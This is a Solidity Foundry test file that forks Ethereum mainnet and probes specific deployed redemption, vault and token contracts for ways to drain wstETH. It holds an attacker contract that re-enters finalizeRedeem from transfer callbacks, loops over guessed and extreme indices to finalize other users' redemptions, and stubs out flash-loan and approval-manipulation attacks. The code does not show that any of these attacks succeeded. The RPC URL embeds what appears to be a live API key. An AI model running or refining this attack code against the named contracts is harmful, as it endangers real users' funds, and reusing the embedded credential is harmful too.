// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

contract ReentrancyExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_IdentifyExternalCallsInFinalizeRedeem() public view {
        console.log("=== IDENTIFYING EXTERNAL CALLS IN FINALIZE REDEEM ===\n");

        bytes memory code = REDEMPTION_0.code;

        // Find the finalizeRedeem function entry and trace its CALLs
        // finalizeRedeem selector: 0xaff6cbf1

        // We know from earlier:
        // - finalizeRedeem jumps to offset around 1133
        // - There are 8 CALL operations in R0

        console.log("All CALL operations in R0:");
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf1) { // CALL
                console.log("CALL at:", i);

                // Check if this is in the finalizeRedeem region (roughly 1133-6000)
                if (i > 1100 && i < 6000) {
                    console.log("  -> In finalizeRedeem region");

                    // Look for target address
                    for (uint j = (i > 100 ? i - 100 : 0); j < i; j++) {
                        if (uint8(code[j]) == 0x73) { // PUSH20
                            address addr;
                            bytes memory addrBytes = new bytes(20);
                            for (uint k = 0; k < 20 && j + 1 + k < code.length; k++) {
                                addrBytes[k] = code[j + 1 + k];
                            }
                            assembly {
                                addr := mload(add(addrBytes, 20))
                            }
                            if (addr != address(0) && uint160(addr) > 0x1000) {
                                console.log("  Target:", addr);
                            }
                        }
                    }
                }
            }
        }

        // Also check for STATICCALL (0xfa) - these are safer but still external
        console.log("\nSTATICCALL operations:");
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xfa) {
                console.log("STATICCALL at:", i);
            }
        }
    }

    function test_TraceTokenTransferCallbacks() public {
        console.log("=== TRACING TOKEN TRANSFER CALLBACKS ===\n");

        // When wstETH is transferred, does it have any callbacks?
        // Let's check if wstETH is a hook token (ERC777 style)

        console.log("wstETH address:", wstETH);

        // Check if wstETH has any special interfaces
        bytes4[] memory interfaces = new bytes4[](5);
        interfaces[0] = bytes4(keccak256("tokensReceived(address,address,address,uint256,bytes,bytes)")); // ERC777
        interfaces[1] = bytes4(keccak256("onTokenTransfer(address,uint256,bytes)")); // ERC677
        interfaces[2] = bytes4(keccak256("supportsInterface(bytes4)")); // ERC165
        interfaces[3] = bytes4(keccak256("granularity()")); // ERC777
        interfaces[4] = bytes4(keccak256("defaultOperators()")); // ERC777

        console.log("Checking ERC777/ERC677 interfaces on wstETH:");
        for (uint i = 0; i < interfaces.length; i++) {
            (bool s,) = wstETH.staticcall(
                abi.encodeWithSelector(interfaces[i])
            );
            if (s) {
                console.log("Found interface:");
                console.logBytes4(interfaces[i]);
            }
        }

        // Check TASSET for hooks
        console.log("\nChecking hooks on TASSET:");
        for (uint i = 0; i < interfaces.length; i++) {
            (bool s,) = TASSET.staticcall(
                abi.encodeWithSelector(interfaces[i])
            );
            if (s) {
                console.log("Found interface:");
                console.logBytes4(interfaces[i]);
            }
        }
    }

    function test_ExploitViaReentrancy() public {
        console.log("=== TESTING REENTRANCY EXPLOIT ===\n");

        // Deploy a reentrant attacker contract
        ReentrantAttacker attackContract = new ReentrantAttacker();
        console.log("Attack contract:", address(attackContract));

        // Fund the attack contract
        deal(TASSET, address(attackContract), 10000e18);
        deal(wstETH, address(attackContract), 100e18); // In case we need it

        // Execute attack
        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        attackContract.attack();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackBalance = IERC20(wstETH).balanceOf(address(attackContract));

        console.log("\nVault after:", vaultAfter / 1e18);
        console.log("Attack contract wstETH:", attackBalance / 1e18);

        if (attackBalance > 0) {
            console.log("*** REENTRANCY ATTACK SUCCESSFUL ***");
        }
    }

    function test_CheckMsgSenderVsOrigin() public {
        console.log("=== CHECKING MSG.SENDER VS TX.ORIGIN DIFFERENCES ===\n");

        // Some contracts use tx.origin for authorization
        // If R0 or RC use tx.origin, we might be able to exploit via contract

        // Let's check what happens when we call via a contract
        MsgSenderChecker checker = new MsgSenderChecker();

        console.log("Checker contract:", address(checker));
        console.log("tx.origin:", tx.origin);

        // Call R0 view functions via checker
        (address sender, address origin) = checker.checkSenders();
        console.log("\nVia checker:");
        console.log("  msg.sender:", sender);
        console.log("  tx.origin:", origin);
    }

    function test_FindRedemptionHijackViaIndex() public {
        console.log("=== FINDING REDEMPTION HIJACK VIA INDEX MANIPULATION ===\n");

        // What if we can finalize someone else's redemption by manipulating the index?

        // First, create our own redemption
        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(REDEMPTION_0, type(uint256).max);
        REDEMPTION_0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        vm.stopPrank();

        // Check our redemption index
        (bool s1, bytes memory d1) = REDEMPTION_0.staticcall(
            abi.encodeWithSignature("getRedeemLength(address)", attacker)
        );
        if (s1) {
            uint256 len = abi.decode(d1, (uint256));
            console.log("Attacker redemption count:", len);
        }

        // Try to finalize with various indices
        vm.warp(block.timestamp + 7 days);

        console.log("\nTrying various indices:");
        for (uint i = 0; i < 5; i++) {
            vm.startPrank(attacker);
            (bool s,) = REDEMPTION_0.call{gas: 200000}(
                abi.encodeWithSignature("finalizeRedeem(uint256)", i)
            );
            console.log("Index", i, ":", s);
            vm.stopPrank();
        }

        // Try large indices
        console.log("\nTrying large indices:");
        uint256[] memory largeIndices = new uint256[](5);
        largeIndices[0] = type(uint256).max;
        largeIndices[1] = type(uint256).max - 1;
        largeIndices[2] = 1e18;
        largeIndices[3] = 1e10;
        largeIndices[4] = 999999;

        for (uint i = 0; i < largeIndices.length; i++) {
            vm.startPrank(attacker);
            (bool s,) = REDEMPTION_0.call{gas: 200000}(
                abi.encodeWithSignature("finalizeRedeem(uint256)", largeIndices[i])
            );
            if (s) {
                console.log("LARGE INDEX SUCCESS:", largeIndices[i]);
            }
            vm.stopPrank();
        }
    }

    function test_FlashLoanAttack() public {
        console.log("=== TESTING FLASH LOAN ATTACK VECTOR ===\n");

        // The 7-day delay prevents flash loans, but what if we can
        // manipulate state during the flash loan callback?

        // Deploy flash loan attacker
        FlashLoanAttacker flashAttacker = new FlashLoanAttacker();
        console.log("Flash attacker:", address(flashAttacker));

        // The attack would need to:
        // 1. Flash loan TASSET (if available) or wstETH
        // 2. Use it to manipulate protocol state
        // 3. Drain funds
        // 4. Repay flash loan

        // Check if TASSET can be flash loaned
        (bool hasFlash,) = TASSET.staticcall(
            abi.encodeWithSignature("maxFlashLoan(address)", TASSET)
        );
        console.log("TASSET has flash loan:", hasFlash);

        // Check wstETH for flash loan
        (bool wstHasFlash,) = wstETH.staticcall(
            abi.encodeWithSignature("maxFlashLoan(address)", wstETH)
        );
        console.log("wstETH has flash loan:", wstHasFlash);
    }

    function test_ExploitViaApprovalManipulation() public {
        console.log("=== TESTING APPROVAL MANIPULATION ===\n");

        // What if we can manipulate approvals to drain tokens?

        // Check current approvals from key contracts
        (bool s1, bytes memory d1) = wstETH.staticcall(
            abi.encodeWithSignature("allowance(address,address)", VAULT, REDEMPTION_CONTROLLER)
        );
        if (s1) {
            uint256 allowance = abi.decode(d1, (uint256));
            console.log("Vault -> RC allowance:", allowance / 1e18);
        }

        (bool s2, bytes memory d2) = wstETH.staticcall(
            abi.encodeWithSignature("allowance(address,address)", VAULT, REDEMPTION_0)
        );
        if (s2) {
            uint256 allowance = abi.decode(d2, (uint256));
            console.log("Vault -> R0 allowance:", allowance / 1e18);
        }

        // Check if anyone else has approval
        (bool s3, bytes memory d3) = wstETH.staticcall(
            abi.encodeWithSignature("allowance(address,address)", VAULT, attacker)
        );
        if (s3) {
            uint256 allowance = abi.decode(d3, (uint256));
            console.log("Vault -> attacker allowance:", allowance / 1e18);
        }
    }
}

contract ReentrantAttacker {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    bool public attacking;
    uint256 public callCount;

    function attack() external {
        attacking = true;

        // Approve and create redemption
        IERC20(TASSET).approve(REDEMPTION_0, type(uint256).max);
        REDEMPTION_0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));

        // The goal is to get a callback during the process
        // and re-enter to manipulate state
    }

    // This gets called when we receive wstETH (if it has hooks)
    receive() external payable {
        if (attacking && callCount < 3) {
            callCount++;
            // Try to re-enter
            REDEMPTION_0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        }
    }

    // ERC777 style callback
    function tokensReceived(
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external {
        if (attacking && callCount < 3) {
            callCount++;
            REDEMPTION_0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        }
    }

    // ERC677 style callback
    function onTokenTransfer(address, uint256, bytes calldata) external returns (bool) {
        if (attacking && callCount < 3) {
            callCount++;
            REDEMPTION_0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        }
        return true;
    }
}

contract MsgSenderChecker {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;

    function checkSenders() external view returns (address sender, address origin) {
        return (msg.sender, tx.origin);
    }

    function callR0AsContract() external returns (bool) {
        (bool s,) = REDEMPTION_0.call(
            abi.encodeWithSignature("owner()")
        );
        return s;
    }
}

contract FlashLoanAttacker {
    // Flash loan receiver interface
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // During the flash loan, try to manipulate protocol
        // This is where we would attempt the exploit

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
